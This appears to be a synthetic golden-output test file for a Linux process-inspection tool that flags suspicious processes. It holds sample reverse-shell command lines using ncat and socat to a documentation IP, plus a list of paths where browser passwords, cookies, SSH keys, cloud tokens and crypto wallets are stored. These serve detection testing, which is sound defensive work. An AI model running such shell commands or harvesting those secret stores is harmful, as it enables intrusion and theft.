@@ -1,0 +1,1354 @@
+{
+ "_note": "SYNTHETIC: Vigil 1's process checks on tests/fixtures/proc and hand-made processes. Regenerate with make_golden.py.",
+ "cases": {
+  "flags": {
+   "1": [],
+   "100": [],
+   "200": [],
+   "300": [
+    [
+     "memory_only",
+     "High",
+     1.0,
+     "runs from memory only (memfd): there is no file on disk"
+    ]
+   ],
+   "301": [
+    [
+     "deleted_binary",
+     "High",
+     0.9,
+     "its program file /opt/tool/bin/tool was deleted while it kept running"
+    ]
+   ],
+   "302": [
+    [
+     "replaced_binary",
+     "Low",
+     0.2,
+     "its program file was replaced while it ran (probably an update of vim)"
+    ]
+   ],
+   "303": [
+    [
+     "temp_binary",
+     "High",
+     0.9,
+     "runs from a temporary folder (/tmp/.x/agent)"
+    ]
+   ],
+   "304": [
+    [
+     "cache_binary",
+     "Medium",
+     0.7,
+     "runs from a cache folder (/home/alice/.cache/upd/upd)"
+    ]
+   ],
+   "305": [
+    [
+     "downloads_binary",
+     "Medium",
+     0.6,
+     "runs straight from Downloads (/home/alice/Downloads/App.AppImage)"
+    ]
+   ],
+   "306": [
+    [
+     "hidden_binary",
+     "Medium",
+     0.5,
+     "runs from a hidden folder (/home/alice/.hidden/bin/miner)"
+    ]
+   ],
+   "307": [],
+   "308": [],
+   "309": [
+    [
+     "ld_preload",
+     "High",
+     0.9,
+     "LD_PRELOAD forces /tmp/libhook.so into it"
+    ]
+   ],
+   "310": [],
+   "311": [
+    [
+     "odd_parent",
+     "High",
+     0.9,
+     "firefox (a web browser) started bash: bash -c id"
+    ]
+   ],
+   "312": [
+    [
+     "odd_parent",
+     "Low",
+     0.2,
+     "firefox (a web browser) opened something with sh -c xdg-open https://example.org"
+    ]
+   ],
+   "313": [
+    [
+     "odd_parent",
+     "High",
+     0.9,
+     "nginx (the web server) started python3.12: python3 -c print(1)"
+    ]
+   ],
+   "314": [
+    [
+     "odd_parent",
+     "High",
+     0.9,
+     "firefox (a web browser) started curl: curl https://example.org"
+    ]
+   ],
+   "315": [
+    [
+     "masquerade_name",
+     "High",
+     0.9,
+     "is named dbus-daemon like a system program, but runs from /home/alice/.local/share/dbus-daemon"
+    ]
+   ],
+   "316": [
+    [
+     "masquerade_name",
+     "Medium",
+     0.6,
+     "is named dbus-daemon like a system program, but its file /usr/bin/tor is a different program"
+    ]
+   ],
+   "317": [],
+   "318": [
+    [
+     "fake_kernel_name",
+     "High",
+     0.9,
+     "calls itself [kworker/0:1] like a kernel thread, but runs /usr/local/bin/kw"
+    ]
+   ],
+   "319": [
+    [
+     "reverse_shell",
+     "High",
+     1.0,
+     "looks like a reverse shell: ncat 203.0.113.5 4444 -e /bin/bash"
+    ]
+   ],
+   "320": [
+    [
+     "reverse_shell",
+     "High",
+     1.0,
+     "looks like a reverse shell: socat tcp:203.0.113.5:4444 exec:/bin/sh"
+    ]
+   ],
+   "321": [
+    [
+     "credential_access",
+     "High",
+     0.9,
+     "has saved browser passwords open (/home/alice/.mozilla/firefox/p/logins.json) and 1 more, which is not its own"
+    ]
+   ],
+   "322": [
+    [
+     "credential_access",
+     "Medium",
+     0.6,
+     "has cloud or developer credentials open (/home/alice/.aws/credentials), which is not its own"
+    ]
+   ],
+   "323": [
+    [
+     "credential_access",
+     "High",
+     0.9,
+     "has a cryptocurrency wallet open (/home/alice/.electrum/wallets/default_wallet), which is not its own"
+    ]
+   ],
+   "324": [],
+   "325": [],
+   "326": [],
+   "327": [
+    [
+     "temp_binary",
+     "High",
+     0.9,
+     "runs from a temporary folder (/tmp/srv)"
+    ],
+    [
+     "listens_from_odd_place",
+     "High",
+     0.8,
+     "listens on port 8080 for the whole network while running from /tmp/srv"
+    ]
+   ],
+   "328": [
+    [
+     "downloads_binary",
+     "Medium",
+     0.6,
+     "runs straight from Downloads (/home/alice/Downloads/srv)"
+    ]
+   ],
+   "329": [],
+   "330": []
+  },
+  "procs": {
+   "1": {
+    "cmdline": [
+     "/sbin/init"
+    ],
+    "comm": "systemd",
+    "exe": "/usr/lib/systemd/systemd",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "systemd",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/lib/systemd/systemd",
+    "pid": 1,
+    "ppid": 0,
+    "secrets": [],
+    "sockets": []
+   },
+   "100": {
+    "cmdline": [
+     "/usr/lib/firefox/firefox"
+    ],
+    "comm": "firefox",
+    "exe": "/usr/lib/firefox/firefox",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "firefox",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/lib/firefox/firefox",
+    "pid": 100,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "200": {
+    "cmdline": [
+     "nginx: worker process"
+    ],
+    "comm": "nginx",
+    "exe": "/usr/sbin/nginx",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "nginx",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/sbin/nginx",
+    "pid": 200,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "300": {
+    "cmdline": [
+     "x"
+    ],
+    "comm": "x",
+    "exe": "/memfd:payload (deleted)",
+    "exe_deleted": true,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "memfd:payload",
+    "package": null,
+    "package_db": null,
+    "path": "/memfd:payload",
+    "pid": 300,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "301": {
+    "cmdline": [
+     "/opt/tool/bin/tool"
+    ],
+    "comm": "tool",
+    "exe": "/opt/tool/bin/tool (deleted)",
+    "exe_deleted": true,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "tool",
+    "package": null,
+    "package_db": null,
+    "path": "/opt/tool/bin/tool",
+    "pid": 301,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "302": {
+    "cmdline": [
+     "vim"
+    ],
+    "comm": "vim",
+    "exe": "/usr/bin/vim (deleted)",
+    "exe_deleted": true,
+    "exists_now": true,
+    "kernel": false,
+    "ld": {},
+    "name": "vim",
+    "package": "vim",
+    "package_db": null,
+    "path": "/usr/bin/vim",
+    "pid": 302,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "303": {
+    "cmdline": [
+     "/tmp/.x/agent"
+    ],
+    "comm": "agent",
+    "exe": "/tmp/.x/agent",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "agent",
+    "package": null,
+    "package_db": null,
+    "path": "/tmp/.x/agent",
+    "pid": 303,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "304": {
+    "cmdline": [
+     "upd"
+    ],
+    "comm": "upd",
+    "exe": "/home/alice/.cache/upd/upd",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "upd",
+    "package": null,
+    "package_db": null,
+    "path": "/home/alice/.cache/upd/upd",
+    "pid": 304,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "305": {
+    "cmdline": [
+     "App.AppImage"
+    ],
+    "comm": "App.AppImage",
+    "exe": "/home/alice/Downloads/App.AppImage",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "App.AppImage",
+    "package": null,
+    "package_db": null,
+    "path": "/home/alice/Downloads/App.AppImage",
+    "pid": 305,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "306": {
+    "cmdline": [
+     "miner"
+    ],
+    "comm": "miner",
+    "exe": "/home/alice/.hidden/bin/miner",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "miner",
+    "package": null,
+    "package_db": null,
+    "path": "/home/alice/.hidden/bin/miner",
+    "pid": 306,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "307": {
+    "cmdline": [
+     "tool"
+    ],
+    "comm": "tool",
+    "exe": "/home/alice/.local/bin/tool",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "tool",
+    "package": null,
+    "package_db": null,
+    "path": "/home/alice/.local/bin/tool",
+    "pid": 307,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "308": {
+    "cmdline": [
+     "rg"
+    ],
+    "comm": "rg",
+    "exe": "/home/alice/.cargo/bin/rg",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "rg",
+    "package": null,
+    "package_db": null,
+    "path": "/home/alice/.cargo/bin/rg",
+    "pid": 308,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "309": {
+    "cmdline": [
+     "sleep",
+     "9"
+    ],
+    "comm": "sleep",
+    "exe": "/usr/bin/sleep",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {
+     "LD_LIBRARY_PATH": "/opt/x",
+     "LD_PRELOAD": "/tmp/libhook.so"
+    },
+    "name": "sleep",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/sleep",
+    "pid": 309,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "310": {
+    "cmdline": [
+     "sleep",
+     "9"
+    ],
+    "comm": "sleep",
+    "exe": "/usr/bin/sleep",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {
+     "LD_AUDIT": "  "
+    },
+    "name": "sleep",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/sleep",
+    "pid": 310,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "311": {
+    "cmdline": [
+     "bash",
+     "-c",
+     "id"
+    ],
+    "comm": "bash",
+    "exe": "/usr/bin/bash",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "bash",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/bash",
+    "pid": 311,
+    "ppid": 100,
+    "secrets": [],
+    "sockets": []
+   },
+   "312": {
+    "cmdline": [
+     "sh",
+     "-c",
+     "xdg-open https://example.org"
+    ],
+    "comm": "bash",
+    "exe": "/usr/bin/bash",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "bash",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/bash",
+    "pid": 312,
+    "ppid": 100,
+    "secrets": [],
+    "sockets": []
+   },
+   "313": {
+    "cmdline": [
+     "python3",
+     "-c",
+     "print(1)"
+    ],
+    "comm": "python3",
+    "exe": "/usr/bin/python3.12",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "python3.12",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/python3.12",
+    "pid": 313,
+    "ppid": 200,
+    "secrets": [],
+    "sockets": []
+   },
+   "314": {
+    "cmdline": [
+     "curl",
+     "https://example.org"
+    ],
+    "comm": "curl",
+    "exe": "/usr/bin/curl",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "curl",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/curl",
+    "pid": 314,
+    "ppid": 100,
+    "secrets": [],
+    "sockets": []
+   },
+   "315": {
+    "cmdline": [
+     "dbus-daemon",
+     "--session"
+    ],
+    "comm": "dbus-daemon",
+    "exe": "/home/alice/.local/share/dbus-daemon",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "dbus-daemon",
+    "package": null,
+    "package_db": null,
+    "path": "/home/alice/.local/share/dbus-daemon",
+    "pid": 315,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "316": {
+    "cmdline": [
+     "dbus-daemon"
+    ],
+    "comm": "dbus-daemon",
+    "exe": "/usr/bin/tor",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "tor",
+    "package": null,
+    "package_db": "pacman",
+    "path": "/usr/bin/tor",
+    "pid": 316,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "317": {
+    "cmdline": [
+     "dbus-daemon"
+    ],
+    "comm": "dbus-daemon",
+    "exe": "/usr/bin/dbus-daemon",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "dbus-daemon",
+    "package": null,
+    "package_db": "pacman",
+    "path": "/usr/bin/dbus-daemon",
+    "pid": 317,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "318": {
+    "cmdline": [
+     "[kworker/0:1]"
+    ],
+    "comm": "kw",
+    "exe": "/usr/local/bin/kw",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "kw",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/local/bin/kw",
+    "pid": 318,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "319": {
+    "cmdline": [
+     "ncat",
+     "203.0.113.5",
+     "4444",
+     "-e",
+     "/bin/bash"
+    ],
+    "comm": "ncat",
+    "exe": "/usr/bin/ncat",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "ncat",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/ncat",
+    "pid": 319,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "320": {
+    "cmdline": [
+     "socat",
+     "tcp:203.0.113.5:4444",
+     "exec:/bin/sh"
+    ],
+    "comm": "socat",
+    "exe": "/usr/bin/socat",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "socat",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/socat",
+    "pid": 320,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "321": {
+    "cmdline": [
+     "python3",
+     "/tmp/steal.py"
+    ],
+    "comm": "python3",
+    "exe": "/usr/bin/python3.12",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "python3.12",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/python3.12",
+    "pid": 321,
+    "ppid": 1,
+    "secrets": [
+     {
+      "kind": "browser_passwords",
+      "label": "saved browser passwords",
+      "path": "/home/alice/.mozilla/firefox/p/logins.json"
+     },
+     {
+      "kind": "ssh_key",
+      "label": "an SSH private key",
+      "path": "/home/alice/.ssh/id_ed25519"
+     }
+    ],
+    "sockets": []
+   },
+   "322": {
+    "cmdline": [
+     "mystery"
+    ],
+    "comm": "mystery",
+    "exe": "/usr/bin/mystery",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "mystery",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/mystery",
+    "pid": 322,
+    "ppid": 1,
+    "secrets": [
+     {
+      "kind": "cloud_creds",
+      "label": "cloud or developer credentials",
+      "path": "/home/alice/.aws/credentials"
+     }
+    ],
+    "sockets": []
+   },
+   "323": {
+    "cmdline": [
+     "mystery2"
+    ],
+    "comm": "mystery2",
+    "exe": "/usr/bin/mystery2",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "mystery2",
+    "package": null,
+    "package_db": "rpm",
+    "path": "/usr/bin/mystery2",
+    "pid": 323,
+    "ppid": 1,
+    "secrets": [
+     {
+      "kind": "wallet",
+      "label": "a cryptocurrency wallet",
+      "path": "/home/alice/.electrum/wallets/default_wallet"
+     }
+    ],
+    "sockets": []
+   },
+   "324": {
+    "cmdline": [
+     "nvim",
+     "/home/alice/.aws/credentials"
+    ],
+    "comm": "nvim",
+    "exe": "/usr/bin/nvim",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "nvim",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/nvim",
+    "pid": 324,
+    "ppid": 1,
+    "secrets": [
+     {
+      "kind": "cloud_creds",
+      "label": "cloud or developer credentials",
+      "path": "/home/alice/.aws/credentials"
+     }
+    ],
+    "sockets": []
+   },
+   "325": {
+    "cmdline": [
+     "chrome_crashpad_handler"
+    ],
+    "comm": "chrome_crashpa",
+    "exe": "/opt/google/chrome/chrome_crashpad_handler",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "chrome_crashpad_handler",
+    "package": null,
+    "package_db": null,
+    "path": "/opt/google/chrome/chrome_crashpad_handler",
+    "pid": 325,
+    "ppid": 1,
+    "secrets": [
+     {
+      "kind": "browser_cookies",
+      "label": "browser cookies (logged-in sessions)",
+      "path": "/home/alice/.config/google-chrome/Default/Cookies"
+     }
+    ],
+    "sockets": []
+   },
+   "326": {
+    "cmdline": [
+     "restic",
+     "backup"
+    ],
+    "comm": "restic",
+    "exe": "/usr/bin/restic",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "restic",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/restic",
+    "pid": 326,
+    "ppid": 1,
+    "secrets": [
+     {
+      "kind": "ssh_key",
+      "label": "an SSH private key",
+      "path": "/home/alice/.ssh/id_rsa"
+     }
+    ],
+    "sockets": []
+   },
+   "327": {
+    "cmdline": [
+     "/tmp/srv"
+    ],
+    "comm": "srv",
+    "exe": "/tmp/srv",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "srv",
+    "package": null,
+    "package_db": null,
+    "path": "/tmp/srv",
+    "pid": 327,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "listen",
+      "local_ip": "0.0.0.0",
+      "local_port": 8080
+     }
+    ]
+   },
+   "328": {
+    "cmdline": [
+     "srv"
+    ],
+    "comm": "srv",
+    "exe": "/home/alice/Downloads/srv",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "srv",
+    "package": null,
+    "package_db": null,
+    "path": "/home/alice/Downloads/srv",
+    "pid": 328,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "listen",
+      "local_ip": "127.0.0.1",
+      "local_port": 9
+     }
+    ]
+   },
+   "329": {
+    "cmdline": [],
+    "comm": "kworker/0:1",
+    "exe": null,
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": true,
+    "ld": {},
+    "name": "x",
+    "package": null,
+    "package_db": null,
+    "path": null,
+    "pid": 329,
+    "ppid": 2,
+    "secrets": [],
+    "sockets": []
+   },
+   "330": {
+    "cmdline": [
+     "bash"
+    ],
+    "comm": "bash",
+    "exe": "/usr/bin/bash",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": {},
+    "name": "bash",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/bash",
+    "pid": 330,
+    "ppid": 999,
+    "secrets": [],
+    "sockets": []
+   }
+  }
+ },
+ "classify": {
+  "/etc/passwd": null,
+  "/home/alice/.aws/config": null,
+  "/home/alice/.aws/credentials": "cloud_creds",
+  "/home/alice/.azure/accessTokens.json": "cloud_creds",
+  "/home/alice/.bitcoin/wallet.dat": "wallet",
+  "/home/alice/.bitcoin/wallets/w1/wallet.dat": "wallet",
+  "/home/alice/.config/BraveSoftware/Default/Network/Cookies": "browser_cookies",
+  "/home/alice/.config/Exodus/exodus.wallet/seed.seco": "wallet",
+  "/home/alice/.config/Ledger Live/app.json": "wallet",
+  "/home/alice/.config/chromium/Default/Login Data": "browser_passwords",
+  "/home/alice/.config/chromium/Default/Web Data": "browser_keys",
+  "/home/alice/.config/chromium/Local State": "browser_keys",
+  "/home/alice/.config/discord/Local Storage/leveldb/000.ldb": "chat_token",
+  "/home/alice/.config/gcloud/credentials.db": "cloud_creds",
+  "/home/alice/.config/gh/hosts.yml": "cloud_creds",
+  "/home/alice/.config/vesktop/Local Storage/leveldb/1.log": "chat_token",
+  "/home/alice/.docker/config.json": "cloud_creds",
+  "/home/alice/.electrum/wallets/default": "wallet",
+  "/home/alice/.ethereum/keystore/UTC--x": "wallet",
+  "/home/alice/.git-credentials": "cloud_creds",
+  "/home/alice/.gnupg/private-keys-v1.d/AB.key": "gpg_key",
+  "/home/alice/.gnupg/pubring.kbx": null,
+  "/home/alice/.gnupg/secring.gpg": "gpg_key",
+  "/home/alice/.kube/config": "cloud_creds",
+  "/home/alice/.local/share/keyrings/login.keyring": "keyring",
+  "/home/alice/.local/share/kwalletd/kdewallet.kwl": "keyring",
+  "/home/alice/.monero/x": "wallet",
+  "/home/alice/.mozilla/firefox/x/cookies.sqlite": "browser_cookies",
+  "/home/alice/.mozilla/firefox/x/key4.db": "browser_passwords",
+  "/home/alice/.netrc": "cloud_creds",
+  "/home/alice/.pgpass": "cloud_creds",
+  "/home/alice/.sparrow/wallets/w": "wallet",
+  "/home/alice/.ssh/aws.pem": "ssh_key",
+  "/home/alice/.ssh/deploy_key": "ssh_key",
+  "/home/alice/.ssh/id_ed25519": "ssh_key",
+  "/home/alice/.ssh/id_ed25519.pub": null,
+  "/home/alice/.ssh/known_hosts": null,
+  "/home/alice/notes.txt": null,
+  "/home/alice/old.kdb": "password_db",
+  "/home/alice/vault.kdbx": "password_db",
+  "/home/alice/x.psafe3": "password_db"
+ },
+ "fixture": {
+  "flags": {
+   "1": [],
+   "2301": [],
+   "4410": [],
+   "4500": [],
+   "5120": [],
+   "5200": [],
+   "6000": [],
+   "640": [],
+   "700": [],
+   "7000": [
+    [
+     "deleted_binary",
+     "High",
+     0.9,
+     "its program file /tmp/.x/agent was deleted while it kept running"
+    ],
+    [
+     "temp_binary",
+     "High",
+     0.9,
+     "runs from a temporary folder (/tmp/.x/agent)"
+    ]
+   ],
+   "812": [],
+   "905": [],
+   "950": []
+  },
+  "procs": {
+   "1": {
+    "cmdline": [
+     "/sbin/init",
+     "splash"
+    ],
+    "comm": "systemd",
+    "exe": "/usr/lib/systemd/systemd",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "systemd",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/lib/systemd/systemd",
+    "pid": 1,
+    "ppid": 0,
+    "secrets": [],
+    "sockets": []
+   },
+   "2301": {
+    "cmdline": [
+     "/usr/bin/gnome-shell"
+    ],
+    "comm": "gnome-shell",
+    "exe": "/usr/bin/gnome-shell",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "gnome-shell",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/gnome-shell",
+    "pid": 2301,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": []
+   },
+   "4410": {
+    "cmdline": [
+     "/usr/lib/firefox/firefox"
+    ],
+    "comm": "firefox",
+    "exe": "/usr/lib/firefox/firefox",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "firefox",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/lib/firefox/firefox",
+    "pid": 4410,
+    "ppid": 2301,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 51234
+     },
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 51240
+     },
+     {
+      "kind": "connection",
+      "local_ip": "2001:db8::50",
+      "local_port": 51000
+     },
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 52000
+     }
+    ]
+   },
+   "4500": {
+    "cmdline": [
+     "/usr/lib/firefox/firefox",
+     "-contentproc",
+     "-childID",
+     "1"
+    ],
+    "comm": "Web Content",
+    "exe": "/usr/lib/firefox/firefox",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "firefox",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/lib/firefox/firefox",
+    "pid": 4500,
+    "ppid": 4410,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 51234
+     }
+    ]
+   },
+   "5120": {
+    "cmdline": [
+     "python3",
+     "/home/alice/.cache/updater.py",
+     "--quiet"
+    ],
+    "comm": "python3",
+    "exe": "/usr/bin/python3.11",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "updater.py (python3.11)",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/python3.11",
+    "pid": 5120,
+    "ppid": 2301,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 40000
+     },
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 41000
+     }
+    ]
+   },
+   "5200": {
+    "cmdline": [
+     "python3",
+     "-u",
+     "-m",
+     "smbsync"
+    ],
+    "comm": "python3",
+    "exe": "/usr/bin/python3.11",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "smbsync (python3.11)",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/python3.11",
+    "pid": 5200,
+    "ppid": 2301,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 47010
+     }
+    ]
+   },
+   "6000": {
+    "cmdline": [
+     "ssh",
+     "backup@203.0.113.10"
+    ],
+    "comm": "ssh",
+    "exe": "/usr/bin/ssh",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "ssh",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/bin/ssh",
+    "pid": 6000,
+    "ppid": 2301,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 46000
+     }
+    ]
+   },
+   "640": {
+    "cmdline": [
+     "/usr/sbin/cupsd",
+     "-l"
+    ],
+    "comm": "cupsd",
+    "exe": "/usr/sbin/cupsd",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "cupsd",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/sbin/cupsd",
+    "pid": 640,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "listen",
+      "local_ip": "127.0.0.1",
+      "local_port": 631
+     }
+    ]
+   },
+   "700": {
+    "cmdline": [
+     "avahi-daemon: running [pc.local]"
+    ],
+    "comm": "avahi-daemon",
+    "exe": "/usr/sbin/avahi-daemon",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "avahi-daemon",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/sbin/avahi-daemon",
+    "pid": 700,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "listen",
+      "local_ip": "0.0.0.0",
+      "local_port": 5353
+     },
+     {
+      "kind": "listen",
+      "local_ip": "::",
+      "local_port": 5353
+     }
+    ]
+   },
+   "7000": {
+    "cmdline": [
+     "/tmp/.x/agent"
+    ],
+    "comm": "upd) S 1 2",
+    "exe": "/tmp/.x/agent (deleted)",
+    "exe_deleted": true,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "agent",
+    "package": null,
+    "package_db": null,
+    "path": "/tmp/.x/agent",
+    "pid": 7000,
+    "ppid": 5120,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 47000
+     }
+    ]
+   },
+   "812": {
+    "cmdline": [
+     "sshd: /usr/sbin/sshd -D [listener]"
+    ],
+    "comm": "sshd",
+    "exe": "/usr/sbin/sshd",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "sshd",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/sbin/sshd",
+    "pid": 812,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "listen",
+      "local_ip": "0.0.0.0",
+      "local_port": 22
+     },
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 22
+     }
+    ]
+   },
+   "905": {
+    "cmdline": [
+     "/usr/libexec/packagekitd"
+    ],
+    "comm": "packagekitd",
+    "exe": "/usr/libexec/packagekitd",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "packagekitd",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/libexec/packagekitd",
+    "pid": 905,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "connection",
+      "local_ip": "192.168.1.50",
+      "local_port": 45000
+     }
+    ]
+   },
+   "950": {
+    "cmdline": [
+     "nginx: worker process"
+    ],
+    "comm": "nginx",
+    "exe": "/usr/sbin/nginx",
+    "exe_deleted": false,
+    "exists_now": false,
+    "kernel": false,
+    "ld": null,
+    "name": "nginx",
+    "package": null,
+    "package_db": null,
+    "path": "/usr/sbin/nginx",
+    "pid": 950,
+    "ppid": 1,
+    "secrets": [],
+    "sockets": [
+     {
+      "kind": "listen",
+      "local_ip": "::",
+      "local_port": 80
+     }
+    ]
+   }
+  }
+ },
+ "home": "/home/alice"
+}
